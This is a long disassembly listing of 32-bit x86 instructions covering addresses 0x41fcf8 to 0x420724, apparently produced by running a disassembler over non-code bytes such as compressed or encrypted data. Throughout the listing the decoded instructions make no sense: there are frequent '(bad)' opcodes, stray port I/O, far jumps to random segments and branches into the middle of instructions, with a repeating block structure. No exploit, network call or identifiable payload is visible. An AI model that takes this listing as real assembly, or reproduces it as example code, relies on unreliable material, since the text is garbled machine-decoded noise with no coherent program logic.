  41fcf8:	mov    es,WORD PTR [esi]
  41fcfa:	cpuid  
  41fcfc:	inc    ecx
  41fcfd:	icebp  
  41fcfe:	(bad)  
  41fcff:	jmp    0x902a9439
  41fd04:	mov    eax,0xa201a627
  41fd09:	push   cs
  41fd0a:	and    eax,0x1527d7a5
  41fd0f:	jae    0x41fcb4
	...
  41fd71:	add    BYTE PTR [eax],al
  41fd73:	add    BYTE PTR [edx+ebp*2],cl
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	ret    
  41fd81:	jl     0x41fd39
  41fd83:	pop    ecx
  41fd84:	push   edi
  41fd85:	push   ebx
  41fd86:	add    DWORD PTR [eax],eax
  41fd88:	add    eax,0xac000001
  41fd8d:	fadd   DWORD PTR [ebx-0x56081e3b]
  41fd93:	ret    
  41fd94:	sub    ch,BYTE PTR [eax-0x576e305]
  41fd9a:	mov    ebp,0x9c5716bb
  41fd9f:	stos   BYTE PTR es:[edi],al
  41fda0:	jne    0x41fd8d
  41fda2:	and    edx,esp
  41fda4:	lea    esi,[ebx+0x1c71625d]
  41fdaa:	rcr    DWORD PTR [edi+0x6f],cl
  41fdad:	push   cs
  41fdae:	add    al,0x16
  41fdb0:	in     eax,dx
  41fdb1:	cmp    DWORD PTR [eax],edx
  41fdb3:	or     esi,ecx
  41fdb5:	jmp    DWORD PTR [edx-0x7a2aa1c7]
  41fdbb:	mov    ds:0xc5c1966b,al
  41fdc0:	jo     0x41fd4b
  41fdc2:	lods   al,BYTE PTR ds:[esi]
  41fdc3:	rol    ch,cl
  41fdc5:	addr16 out dx,eax
  41fdc7:	mov    dl,al
  41fdc9:	out    0x52,eax
  41fdcb:	cmp    BYTE PTR ds:[esi+0x30f27213],dl
  41fdd2:	xor    DWORD PTR [ebp+0x32],edi
  41fdd5:	imul   ebx,DWORD PTR [edx],0xffffffaf
  41fdd8:	mov    edx,0xc88f15b
  41fddd:	(bad)  [ebx]
  41fddf:	jmp    0x41fd98
  41fde1:	(bad)  
  41fde2:	push   esi
  41fde3:	sub    al,0x7c
  41fde5:	xchg   edi,eax
  41fde6:	cmp    DWORD PTR [esi+0x22],ebx
  41fde9:	inc    DWORD PTR [esi-0x7f]
  41fdec:	mov    edx,DWORD PTR [edi+0x5b]
  41fdef:	adc    ah,BYTE PTR [esi-0x53590fe]
  41fdf5:	or     al,0xa4
  41fdf7:	lock mov bh,0xaa
  41fdfa:	push   esp
  41fdfb:	mov    WORD PTR [ecx+0x6e321405],cs
  41fe01:	dec    esp
  41fe02:	pop    ds
  41fe03:	adc    eax,0xf3e97819
  41fe08:	in     eax,0x69
  41fe0a:	xor    ebp,edx
  41fe0c:	call   0x4e5:0xb2630d04
  41fe13:	add    eax,0x90a46414
  41fe18:	aad    0x7
  41fe1a:	je     0x41fe48
  41fe1c:	fmulp  st(2),st
  41fe1e:	(bad)  
  41fe1f:	js     0x41fdfd
  41fe21:	or     bl,BYTE PTR [edx]
  41fe23:	in     al,0x82
  41fe25:	inc    ebx
  41fe26:	mov    bl,0x25
  41fe28:	int3   
  41fe29:	dec    ebx
  41fe2a:	push   ebx
  41fe2b:	add    esi,DWORD PTR [ecx+0x61]
  41fe2e:	test   dh,bh
  41fe30:	ret    
  41fe31:	adc    bl,BYTE PTR [edx+edi*1-0x380b1d9c]
  41fe38:	cmp    BYTE PTR [esp+ebp*4-0x71a4733d],0xf1
  41fe40:	test   DWORD PTR [eax],ecx
  41fe42:	push   ds
  41fe43:	inc    ebx
  41fe44:	inc    ebp
  41fe45:	pop    ecx
  41fe46:	stc    
  41fe47:	or     eax,0xe81b2596
  41fe4c:	rol    DWORD PTR [edi-0x54ad203c],cl
  41fe52:	xor    eax,0x2eb55479
  41fe57:	add    eax,0x79029b9b
  41fe5c:	xor    cl,BYTE PTR [edi+0x6a]
  41fe5f:	add    eax,0xd6b66537
  41fe64:	mov    eax,0x895b9ce5
  41fe69:	sub    bh,BYTE PTR [eax+0x1e8b0b7a]
  41fe6f:	or     esi,esi
  41fe71:	cmp    edx,edx
  41fe73:	pop    ebp
  41fe74:	ins    DWORD PTR es:[edi],dx
  41fe75:	jmp    0xa68e:0x7a12c10a
  41fe7c:	lods   eax,DWORD PTR ds:[esi]
  41fe7d:	shl    DWORD PTR [edx],0x37
  41fe80:	mov    ah,0xf3
  41fe82:	jns    0x41fe07
  41fe84:	(bad)
  41fe87:	mov    dh,al
  41fe89:	add    ecx,DWORD PTR [edx-0x4f]
  41fe8c:	pop    ss
  41fe8d:	lods   eax,DWORD PTR ds:[esi]
  41fe8e:	imul   esi,DWORD PTR [esi+0xd1],0x0
	...
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0xf7
  41ff01:	(bad)  
  41ff02:	lock sub ebx,DWORD PTR [esp+edx*2+0x1]
  41ff07:	add    BYTE PTR ds:0x3f000001,al
  41ff0d:	jns    0x41ff03
  41ff0f:	arpl   WORD PTR [esi+0x5498af1e],ax
  41ff15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff16:	xchg   BYTE PTR [eax-0x362dc3c4],ah
  41ff1c:	mov    ah,0x32
  41ff1e:	outs   dx,BYTE PTR ds:[esi]
  41ff1f:	mov    ?,WORD PTR [ebx-0x6e]
  41ff22:	xor    al,0x74
  41ff24:	imul   edx,DWORD PTR [esi+ebx*8+0x7],0x661fe6d5
  41ff2c:	adc    dl,BYTE PTR [esi+edi*8+0xe632e52]
  41ff33:	mov    cl,0xc2
  41ff35:	push   ecx
  41ff36:	cmp    al,0xe5
  41ff38:	gs push cs
  41ff3a:	inc    ebx
  41ff3b:	ins    DWORD PTR es:[edi],dx
  41ff3c:	inc    ebp
  41ff3d:	das    
  41ff3e:	mov    ch,0x7f
  41ff40:	mov    al,0x3d
  41ff42:	cld    
  41ff43:	inc    ebx
  41ff44:	loope  0x41ff2d
  41ff46:	or     BYTE PTR [eax],bl
  41ff48:	jecxz  0x41ff75
  41ff4a:	pop    ebx
  41ff4b:	pop    ebx
  41ff4c:	cld    
  41ff4d:	cmp    edi,DWORD PTR [ebx+0x4c3fed69]
  41ff53:	dec    ecx
  41ff54:	pushf  
  41ff55:	clc    
  41ff56:	ins    DWORD PTR es:[edi],dx
  41ff57:	out    0x21,eax
  41ff59:	imul   edx,ecx,0xfffffff6
  41ff5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff5d:	enter  0xa438,0x6d
  41ff61:	pop    ds
  41ff62:	jne    0x41fef5
  41ff64:	(bad)  
  41ff65:	pop    esp
  41ff66:	pop    ebx
  41ff67:	shl    BYTE PTR [edx+0xcbb9ae2],1
  41ff6d:	scas   al,BYTE PTR es:[edi]
  41ff6e:	or     al,0x81
  41ff70:	sbb    ebx,DWORD PTR [ebp+0x24584788]
  41ff76:	test   eax,0xec194b7e
  41ff7b:	pop    ebx
  41ff7c:	push   eax
  41ff7d:	push   ss
  41ff7e:	jnp    0x41ff0f
  41ff80:	rol    ah,1
  41ff82:	xchg   DWORD PTR [ecx-0x7d572cc1],eax
  41ff88:	jae    0x41fffb
  41ff8a:	int    0xc4
  41ff8c:	inc    ebp
  41ff8d:	ss std 
  41ff8f:	je     0x41ffc8
  41ff91:	and    esp,DWORD PTR [edx+0x1c2f1247]
  41ff97:	sub    DWORD PTR [edx+eiz*8-0x655aa778],edi
  41ff9e:	aad    0x7c
  41ffa0:	jb     0x41ffbd
  41ffa2:	(bad)  
  41ffa4:	outs   dx,BYTE PTR ds:[esi]
  41ffa5:	dec    edi
  41ffa6:	sti    
  41ffa7:	push   eax
  41ffa8:	xchg   esp,eax
  41ffa9:	pop    edi
  41ffaa:	pop    esi
  41ffab:	lahf   
  41ffac:	cmp    eax,0x19bc7493
  41ffb1:	and    esi,DWORD PTR [edi-0x4c087d77]
  41ffb7:	xor    eax,0x385048de
  41ffbc:	lods   eax,DWORD PTR ds:[esi]
  41ffbd:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41ffbf:	cmc    
  41ffc0:	(bad)  
  41ffc1:	mov    ds:0x4c42736,eax
  41ffc6:	and    BYTE PTR [edi-0x69ce5dfa],dh
  41ffcc:	xor    esp,eax
  41ffce:	out    dx,al
  41ffcf:	test   eax,0x6ca2020
  41ffd4:	push   esi
  41ffd5:	jnp    0x41ff95
  41ffd7:	inc    eax
  41ffd8:	inc    edx
  41ffd9:	sub    DWORD PTR [esi+0x1a],esp
  41ffdc:	xlat   BYTE PTR ds:[ebx]
  41ffdd:	add    esi,DWORD PTR [eax-0x775cd982]
  41ffe3:	and    al,cl
  41ffe5:	ins    BYTE PTR es:[edi],dx
  41ffe6:	(bad)  
  41ffe7:	jns    0x41ff6e
  41ffe9:	push   edx
  41ffea:	mov    bl,0x5b
  41ffec:	xchg   DWORD PTR [ecx+ecx*1+0x68],ebp
  41fff0:	xchg   ecx,eax
  41fff1:	lods   al,BYTE PTR ds:[esi]
  41fff2:	or     al,0xb2
  41fff4:	retf   0x80cd
  41fff7:	stos   DWORD PTR es:[edi],eax
  41fff8:	outs   dx,BYTE PTR ds:[esi]
  41fff9:	shl    BYTE PTR [eax+eax*2-0x4a8450f4],0x4c
  420001:	cmp    ebp,ebx
  420003:	inc    eax
  420004:	pop    esi
  420005:	in     al,0x71
  420007:	xchg   ebp,eax
  420008:	pushf  
  420009:	xchg   dl,cl
  42000b:	into   
  42000c:	scas   eax,DWORD PTR es:[edi]
  42000d:	add    al,0xde
  42000f:	xchg   BYTE PTR [ebx+0x0],cl
	...
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [edx-0x5b],ah
  420076:	jbe    0x4200f7
  420078:	idiv   edi
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffffc8
  420081:	das    
  420082:	push   DWORD PTR [ebp+0x61]
  420085:	push   ebp
  420086:	add    DWORD PTR [eax],eax
  420088:	add    eax,0x95000001
  42008d:	sti    
  42008e:	ds scas eax,DWORD PTR es:[edi]
  420090:	sbb    edi,eax
  420092:	loop   0x42005f
  420094:	pop    esp
  420095:	repz push DWORD PTR [ebx+0x492fb574]
  42009c:	sub    eax,0xfc8eddda
  4200a1:	arpl   WORD PTR [ecx-0x48],ax
  4200a4:	(bad)  
  4200a5:	shr    BYTE PTR [edi],cl
  4200a7:	test   DWORD PTR [ecx+0x67d7fda],edx
  4200ad:	call   FWORD PTR [ecx+0x19]
  4200b0:	inc    ebp
  4200b1:	jp     0x4200c8
  4200b3:	mov    ds:0xaf0890c8,eax
  4200b8:	cmp    DWORD PTR [edx+0x2],esi
  4200bb:	jns    0x420062
  4200bd:	icebp  
  4200be:	xchg   edx,eax
  4200bf:	rcr    BYTE PTR [ebx-0x29],0x73
  4200c3:	inc    edi
  4200c4:	lea    edx,[ebp+0x22e38a86]
  4200ca:	in     eax,dx
  4200cb:	push   esp
  4200cc:	inc    ecx
  4200cd:	jge    0x42009d
  4200cf:	pop    ebx
  4200d0:	sub    ebp,DWORD PTR [esi-0x63]
  4200d3:	out    0x95,al
  4200d5:	cld    
  4200d6:	push   ecx
  4200d7:	xlat   BYTE PTR ds:[ebx]
  4200d8:	std    
  4200d9:	pop    eax
  4200da:	(bad)  
  4200db:	cli    
  4200dc:	sub    eax,0x1feb336
  4200e1:	inc    edx
  4200e2:	sbb    edx,ecx
  4200e4:	repz int 0x23
  4200e7:	pop    ds
  4200e8:	fldcw  WORD PTR [esi]
  4200ea:	js     0x420103
  4200ec:	into   
  4200ed:	pop    ss
  4200ee:	jle    0x4200b6
  4200f0:	xlat   BYTE PTR ds:[ebx]
  4200f1:	adc    BYTE PTR [eax-0x7fd03dee],dh
  4200f7:	inc    esp
  4200f8:	hlt    
  4200f9:	xchg   ebx,eax
  4200fa:	fidiv  DWORD PTR [eax+0x4420b74a]
  420100:	xchg   esi,eax
  420101:	sti    
  420102:	xchg   ebx,eax
  420103:	jecxz  0x4200fb
  420105:	jmp    0x7194:0x6fa0e9b5
  42010c:	xchg   ebp,eax
  42010d:	pushf  
  42010e:	test   DWORD PTR [ebx-0x18],eax
  420111:	retf   0x49f5
  420114:	in     al,dx
  420115:	add    bh,BYTE PTR fs:[ebp+0x2b]
  420119:	rcl    ah,0x22
  42011c:	imul   edx
  42011e:	daa    
  42011f:	ret    
  420120:	sets   BYTE PTR [edi-0x3a]
  420124:	mov    ch,dh
  420126:	ins    BYTE PTR es:[edi],dx
  420127:	or     bl,bl
  420129:	int    0x51
  42012b:	xor    esi,edx
  42012d:	mov    ecx,0xa282d0c4
  420132:	xchg   ebx,eax
  420133:	mov    cl,0xa4
  420135:	xchg   BYTE PTR gs:[ebx-0x51],dl
  420139:	inc    esp
  42013b:	mov    esp,0x32dceef
  420140:	xchg   ebx,eax
  420141:	arpl   bx,bx
  420143:	test   al,0x46
  420145:	nop
  420146:	in     eax,dx
  420147:	xchg   ebx,eax
  420148:	sub    DWORD PTR [ebx+0x4744469c],esi
  42014e:	(bad)  
  42014f:	in     al,dx
  420150:	push   edx
  420151:	ins    BYTE PTR es:[edi],dx
  420152:	mov    cl,ch
  420154:	xchg   ebx,eax
  420155:	cmp    eax,0xc706a5d6
  42015a:	fsub   DWORD PTR [ecx-0x39]
  42015d:	ja     0x420155
  42015f:	retf   0xa7fe
  420162:	popf   
  420163:	lea    edx,[ebx-0x13]
  420166:	xchg   edx,eax
  420167:	retf   
  420168:	aaa    
  420169:	and    esi,DWORD PTR [eax-0x69]
  42016c:	test   DWORD PTR [ecx],ebx
  42016e:	aas    
  42016f:	out    dx,al
  420170:	shr    DWORD PTR [edx-0x42],1
  420173:	mov    esp,0x9852164
  420178:	cmp    BYTE PTR [ecx+ebx*2-0x14],cl
  42017c:	pop    ss
  42017d:	inc    esp
  42017e:	inc    ebx
  42017f:	call   0x5389:0x6fd376d8
  420186:	popf   
  420187:	(bad)  [ebp-0x3572fe2c]
  42018d:	sub    DWORD PTR cs:[ebp+0xe8],ebp
	...
  4201f4:	jae    0x4201c5
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx+0x11145441],1
  420204:	push   si
  420206:	add    DWORD PTR [eax],eax
  420208:	add    eax,0xe5000001
  42020d:	call   FWORD PTR [eax+esi*1]
  420210:	adc    cl,ch
  420212:	sbb    bl,BYTE PTR [ecx-0x12]
  420215:	xchg   ebx,eax
  420216:	mov    dh,0x30
  420218:	fwait
  420219:	push   es
  42021a:	ins    BYTE PTR es:[edi],dx
  42021b:	cdq    
  42021c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42021d:	dec    ebx
  42021e:	sbb    ebx,DWORD PTR [edx-0x7fd040af]
  420224:	inc    ebx
  420225:	push   esp
  420226:	sar    DWORD PTR [ecx],0x68
  420229:	push   0x1a
  42022b:	jne    0x420201
  42022d:	popf   
  42022e:	push   ebp
  42022f:	mov    edi,DWORD PTR [eax-0x35c93bdc]
  420235:	xlat   BYTE PTR ds:[ebx]
  420236:	push   ebx
  420237:	pop    eax
  420238:	xchg   esi,eax
  420239:	fimul  WORD PTR [esi+0x22]
  42023c:	mov    bl,0x73
  42023e:	jbe    0x420241
  420240:	and    al,0x2d
  420242:	stc    
  420243:	fs aas 
  420245:	lahf   
  420246:	test   DWORD PTR [edi+0x45e22979],esp
  42024c:	ret    
  42024d:	int    0xbd
  42024f:	pop    edx
  420250:	jmp    0x396d:0x2d961a0
  420257:	dec    esi
  420258:	(bad)  
  420259:	pmaxsw mm5,mm5
  42025c:	or     al,0xcf
  42025e:	mov    ds:0xe131a197,al
  420263:	dec    ecx
  420264:	inc    esp
  420265:	stos   DWORD PTR es:[edi],eax
  420266:	in     eax,dx
  420267:	sti    
  420268:	cs pop ebp
  42026a:	dec    edi
  42026b:	aaa    
  42026c:	cmp    DWORD PTR [edi-0x52],edi
  42026f:	jg     0x42021f
  420271:	jo     0x420275
  420273:	shl    DWORD PTR [ecx],cl
  420275:	lods   al,BYTE PTR ds:[esi]
  420276:	dec    edx
  420277:	jmp    0x420277
  420279:	(bad)  
  42027a:	fdivr  DWORD PTR [edi-0x79c90835]
  420280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420281:	pop    ebp
  420282:	das    
  420283:	jne    0x420280
  420285:	mov    ah,0xcc
  420287:	jmp    0x6fda1c2
  42028c:	push   ecx
  42028d:	in     eax,0x87
  42028f:	cmp    dl,0x6
  420292:	xchg   esi,eax
  420293:	mov    ch,0x92
  420295:	push   0x75
  420297:	sub    DWORD PTR [esi-0x4af4a6ed],eax
  42029d:	jl     0x42023a
  42029f:	shr    al,cl
  4202a1:	xor    ah,bl
  4202a3:	sub    al,0x42
  4202a5:	ins    BYTE PTR es:[edi],dx
  4202a6:	dec    esp
  4202a7:	int    0x51
  4202a9:	or     dh,BYTE PTR [ecx]
  4202ab:	cmp    eax,0x6bdcf7e
  4202b0:	rol    BYTE PTR [ecx],cl
  4202b2:	repz fld st(1)
  4202b5:	sbb    al,0xd0
  4202b7:	add    bl,ah
  4202b9:	(bad)  
  4202ba:	fstp   QWORD PTR [eax+0x3f]
  4202bd:	push   ds
  4202be:	jno    0x4202f0
  4202c0:	jmp    FWORD PTR [ebp+edi*4+0x6b9d8eb7]
  4202c7:	mov    WORD PTR [esi+0x349bd632],ds
  4202cd:	mov    ebx,0x162aa240
  4202d2:	sbb    al,0xfc
  4202d4:	lea    esp,[edi+0x33]
  4202d7:	pop    esp
  4202d8:	mov    ah,0x47
  4202da:	in     al,0x17
  4202dc:	inc    ebx
  4202dd:	scas   al,BYTE PTR es:[edi]
  4202de:	jge    0x420281
  4202e0:	ror    BYTE PTR [ecx],1
  4202e2:	in     al,0xc9
  4202e4:	cmp    al,al
  4202e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202e7:	pop    ds
  4202e8:	popa   
  4202e9:	(bad)  
  4202ea:	jne    0x4202dc
  4202ec:	ins    DWORD PTR es:[edi],dx
  4202ed:	hlt    
  4202ee:	les    edi,FWORD PTR [eax-0x7426a765]
  4202f4:	xchg   DWORD PTR [esi-0x2fc46a28],esp
  4202fa:	xor    eax,0x3702b088
  4202ff:	adc    edx,esp
  420301:	into   
  420302:	in     al,0xa0
  420304:	jb     0x42034d
  420306:	retf   0x12e0
  420309:	xor    edx,DWORD PTR gs:[ecx-0x22]
  42030d:	jecxz  0x420302
  42030f:	(bad)  
  420310:	bound  eax,QWORD PTR [eax]
	...
  420372:	add    BYTE PTR [eax],al
  420374:	inc    ecx
  420375:	push   es
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	test   eax,0x6bf6e416
  420385:	push   edi
  420386:	add    DWORD PTR [eax],eax
  420388:	add    eax,0xe6000001
  42038d:	mov    DWORD PTR [edx],eax
  42038f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420390:	add    dl,BYTE PTR [esi-0x36e858b6]
  420396:	pushf  
  420397:	mov    ds:0xcd733ae3,al
  42039c:	adc    eax,0xce599a1e
  4203a1:	and    BYTE PTR [edi+edx*4],dl
  4203a4:	cdq    
  4203a5:	xchg   esp,eax
  4203a6:	mov    eax,ds:0x64bf42e3
  4203ab:	ss xor eax,0x2a236170
  4203b1:	cmc    
  4203b2:	cmp    al,0xf5
  4203b4:	lds    esi,FWORD PTR [eax]
  4203b6:	jno    0x420395
  4203b8:	sub    eax,0x9158717c
  4203bd:	adc    DWORD PTR [edx+eiz*8-0x2a5d8d31],0xffffffa4
  4203c5:	add    esp,DWORD PTR [ebp+0x17]
  4203c8:	(bad)  
  4203c9:	out    0x5c,al
  4203cb:	mov    bh,BYTE PTR [ebp+0x4197873a]
  4203d1:	cmc    
  4203d2:	sbb    cl,BYTE PTR [esi-0x73cda23e]
  4203d8:	popf   
  4203d9:	gs mov al,0x1d
  4203dc:	loop   0x42038e
  4203de:	dec    esp
  4203df:	fisub  DWORD PTR [esi-0x4c26f1ae]
  4203e5:	pop    edi
  4203e6:	push   eax
  4203e7:	inc    ebp
  4203e8:	inc    esp
  4203e9:	loope  0x42041e
  4203eb:	xchg   BYTE PTR [edx+0x2e],ch
  4203ee:	pop    ecx
  4203ef:	jo     0x420399
  4203f1:	inc    ecx
  4203f2:	pop    ss
  4203f3:	mov    ah,0xa8
  4203f5:	xor    dh,BYTE PTR [esi+0x6b]
  4203f8:	inc    eax
  4203f9:	cwde   
  4203fa:	bound  edx,QWORD PTR [ebp+ebp*2-0x5b]
  4203fe:	out    0xe1,eax
  420400:	xchg   ebp,eax
  420401:	dec    ebx
  420402:	or     esp,DWORD PTR [edi-0x1d]
  420405:	int    0x32
  420407:	cmp    al,0x24
  420409:	ja     0x4203e6
  42040b:	xchg   edi,eax
  42040c:	add    edx,DWORD PTR [esi+0x44]
  42040f:	sub    edi,edi
  420411:	ret    0x8ee0
  420414:	inc    esi
  420415:	push   ebx
  420416:	or     BYTE PTR [ebx+0x3f],cl
  420419:	pop    es
  42041a:	xchg   edx,eax
  42041b:	push   ss
  42041c:	fdiv   QWORD PTR [ebx]
  42041e:	jle    0x420473
  420420:	mov    ah,0x32
  420422:	adc    bl,BYTE PTR [esi-0x4]
  420425:	fnsave [esi+0x119a60df]
  42042b:	dec    edx
  42042c:	popf   
  42042d:	jns    0x4203f8
  42042f:	rcl    BYTE PTR [edx],cl
  420431:	sub    ebx,DWORD PTR [edi]
  420433:	stos   BYTE PTR es:[edi],al
  420434:	pop    esi
  420435:	cmp    DWORD PTR [edx-0x4e],edi
  420438:	jmp    0xe876:0x6808dce2
  42043f:	pop    ss
  420440:	enter  0x70de,0xf2
  420444:	mov    cl,0x50
  420446:	push   ds
  420447:	fadd   QWORD PTR [eax+0x309a7fd1]
  42044d:	pushw  0xffec
  420450:	pusha  
  420451:	dec    esi
  420452:	jmp    0x42044d
  420454:	loope  0x4204a9
  420456:	xor    BYTE PTR [ebp+ebp*8-0x38],dl
  42045a:	xchg   esi,eax
  42045b:	shr    DWORD PTR [eax+0x51dcd3ae],1
  420461:	fstp   TBYTE PTR [eax-0x75953650]
  420467:	addr16 mov ss,edx
  42046a:	rol    DWORD PTR es:[esi-0x718074e7],cl
  420471:	xchg   edi,eax
  420472:	mov    ecx,0x7235551
  420477:	cwde   
  420478:	aam    0xe8
  42047a:	into   
  42047b:	jge    0x420482
  42047d:	xchg   edi,eax
  42047e:	jnp    0x4204b7
  420480:	jns    0x4204b3
  420482:	in     al,dx
  420483:	push   0xffffffec
  420485:	pop    ebx
  420486:	mov    al,0xfc
  420488:	pop    edx
  420489:	sbb    DWORD PTR [eax+0x42789d7e],ebx
  42048f:	inc    eax
  420490:	rol    BYTE PTR [eax],0x0
	...
  4204f3:	add    BYTE PTR [esi+0x7f125794],ch
  4204f9:	shr    edi,cl
  4204fb:	mov    esp,0x5a7f6c39
  420500:	nop
  420501:	mov    ds:0x58701587,al
  420506:	add    DWORD PTR [eax],eax
  420508:	add    eax,0xd6000001
  42050d:	(bad)
  420512:	mov    ds:0x23594460,al
  420517:	or     ebx,DWORD PTR [edi+ecx*4+0x4b]
  42051b:	cwde   
  42051c:	push   edi
  42051d:	scas   al,BYTE PTR es:[edi]
  42051e:	aas    
  42051f:	inc    ecx
  420520:	ror    DWORD PTR [ecx-0x5407dad2],cl
  420526:	mov    cl,0xb8
  420528:	and    ebx,DWORD PTR [edx-0x30]
  42052b:	out    dx,eax
  42052c:	fdiv   st(1),st
  42052e:	les    esi,FWORD PTR [ebx-0x20]
  420531:	aas    
  420532:	sbb    eax,0xc7709e46
  420537:	clc    
  420538:	inc    edi
  420539:	out    dx,eax
  42053a:	xor    esi,eax
  42053c:	(bad)  
  42053d:	jge    0x4205af
  42053f:	das    
  420540:	adc    ecx,ecx
  420542:	add    BYTE PTR [ebx+0x56],dh
  420545:	out    dx,al
  420546:	out    dx,eax
  420547:	and    al,0xfd
  420549:	mov    eax,ds:0x455ca2a6
  42054e:	sahf   
  42054f:	inc    esp
  420550:	pusha  
  420551:	xchg   ecx,eax
  420552:	xchg   BYTE PTR [edx-0x3234e0aa],dh
  420558:	hlt    
  420559:	push   ecx
  42055a:	lahf   
  42055b:	or     eax,0xa448d135
  420560:	push   esp
  420561:	into   
  420562:	sar    bl,cl
  420564:	cmp    cl,BYTE PTR [edx-0x274e74ff]
  42056a:	dec    ebp
  42056b:	mov    ebp,edi
  42056d:	sub    BYTE PTR [ecx+ebx*8],0xfa
  420571:	mov    ds:0x69571634,al
  420576:	adc    BYTE PTR [edi],dl
  420578:	lds    edi,FWORD PTR [edx-0x1]
  42057b:	repnz dec ecx
  42057d:	retf   
  42057e:	test   al,0x3d
  420581:	out    0x3a,al
  420583:	jo     0x42053a
  420585:	test   ebx,esi
  420587:	call   0x15cc4313
  42058c:	and    cl,0xb1
  42058f:	dec    ecx
  420590:	loop   0x4205a8
  420592:	fcmovnb st,st(6)
  420594:	and    ah,BYTE PTR [ecx]
  420596:	mov    ebp,0xe1f5f291
  42059b:	sbb    eax,0xc78ccaf1
  4205a0:	mov    al,dh
  4205a2:	xor    dl,cl
  4205a4:	and    esi,DWORD PTR [ebp+0x2323ceb9]
  4205aa:	je     0x4205cc
  4205ac:	lahf   
  4205ad:	cwde   
  4205ae:	daa    
  4205af:	loope  0x420619
  4205b1:	out    0x6d,eax
  4205b3:	jp     0x4205aa
  4205b5:	in     eax,dx
  4205b6:	push   0xffffffbe
  4205b8:	pop    ebp
  4205b9:	(bad)  
  4205ba:	jo     0x42059f
  4205bc:	addr16 xor al,0x36
  4205bf:	fdivr  DWORD PTR [ebx-0x2c7528df]
  4205c5:	mov    bl,0xd4
  4205c7:	cld    
  4205c8:	ret    
  4205c9:	pop    edi
  4205ca:	push   cs
  4205cb:	push   es
  4205cc:	adc    esi,DWORD PTR [esp+edi*4-0x55]
  4205d0:	pop    es
  4205d1:	cmp    bh,BYTE PTR [esi+0x5e6d6f4d]
  4205d7:	add    al,0x1e
  4205d9:	inc    esp
  4205da:	lods   eax,DWORD PTR ds:[esi]
  4205db:	stc    
  4205dc:	sub    ch,BYTE PTR [ecx+0x162eaa4f]
  4205e2:	jno    0x42064b
  4205e4:	fndisi(8087 only) 
  4205e6:	pop    esi
  4205e7:	iret   
  4205e8:	inc    ebx
  4205e9:	mov    esi,0x4e749976
  4205ee:	or     DWORD PTR [ebx+0x71],eax
  4205f1:	std    
  4205f2:	xor    al,0xa
  4205f4:	sbb    ebx,DWORD PTR [ebx]
  4205f6:	jmp    0xfdfc:0xed337b17
  4205fd:	imul   edx,ebx,0x4d
  420600:	push   ebx
  420601:	add    DWORD PTR es:[esi],ecx
  420604:	jle    0x42063c
  420606:	adc    eax,0xbd949915
  42060b:	(bad)  
  42060c:	call   0xc7404810
	...
  420671:	add    BYTE PTR [eax],al
  420673:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42067a:	mov    ah,0xec
  42067c:	lds    eax,FWORD PTR [eax]
  42067e:	aad    0x78
  420680:	jle    0x420632
  420682:	dec    ecx
  420683:	addr16 jne 0x4206df
  420686:	add    DWORD PTR [eax],eax
  420688:	add    eax,0x42000001
  42068d:	sub    edi,edx
  42068f:	pop    edx
  420690:	in     eax,dx
  420691:	push   ds
  420692:	mov    BYTE PTR [ebx],cl
  420694:	loopne 0x420670
  420696:	cmp    eax,0xd72bf170
  42069b:	fmul   st,st(7)
  42069d:	and    ecx,DWORD PTR [eax]
  42069f:	xor    al,0x11
  4206a1:	mov    eax,0x6ad0c872
  4206a6:	and    al,dh
  4206a8:	sahf   
  4206a9:	ins    DWORD PTR es:[edi],dx
  4206aa:	sbb    DWORD PTR [edi],edi
  4206ac:	out    dx,al
  4206ad:	mov    esp,DWORD PTR [ebp+0x64b5923a]
  4206b3:	fdivp  st(1),st
  4206b5:	mov    ds:0x328d1305,eax
  4206ba:	das    
  4206bb:	mov    edi,0xeec237d1
  4206c0:	fs (bad) 
  4206c2:	mov    ebp,0xc0f38f2
  4206c7:	adc    edi,DWORD PTR [ebx]
  4206c9:	add    eax,0x8ba119a6
  4206ce:	jo     0x4206ee
  4206d0:	jg     0x42073a
  4206d2:	cs rep stos DWORD PTR es:[edi],eax
  4206d5:	addr16 mov bh,0x4b
  4206d8:	xchg   edi,eax
  4206d9:	push   esi
  4206da:	in     al,0x45
  4206dc:	add    esp,DWORD PTR [esi-0x1a2949c6]
  4206e2:	sub    al,0xd8
  4206e4:	or     bh,BYTE PTR [ecx+edi*8]
  4206e7:	iret   
  4206e8:	popa   
  4206e9:	lods   al,BYTE PTR ds:[esi]
  4206ea:	aas    
  4206eb:	int3   
  4206ec:	pop    ecx
  4206ed:	jecxz  0x4206fb
  4206ef:	fiadd  WORD PTR [eax-0x7c]
  4206f2:	sbb    BYTE PTR [edx-0x1a],dl
  4206f5:	inc    eax
  4206f6:	xchg   edx,eax
  4206f7:	cmp    eax,0x75c1a62f
  4206fc:	cmc    
  4206fd:	adc    eax,0xa7f066e0
  420702:	pop    edx
  420703:	mov    edi,0x1ec504e5
  420708:	data16 repnz cmp dl,BYTE PTR [ebp-0x5e]
  42070d:	loop   0x420755
  42070f:	jbe    0x42069a
  420711:	and    dh,BYTE PTR [esi+0x65]
  420714:	xchg   edi,eax
  420715:	dec    edi
  420716:	fadd   DWORD PTR [edx+0x3eff340a]
  42071c:	mov    eax,0xacea86c2
  420721:	xor    DWORD PTR [esi+0x2c],esp
  420724:	cli    
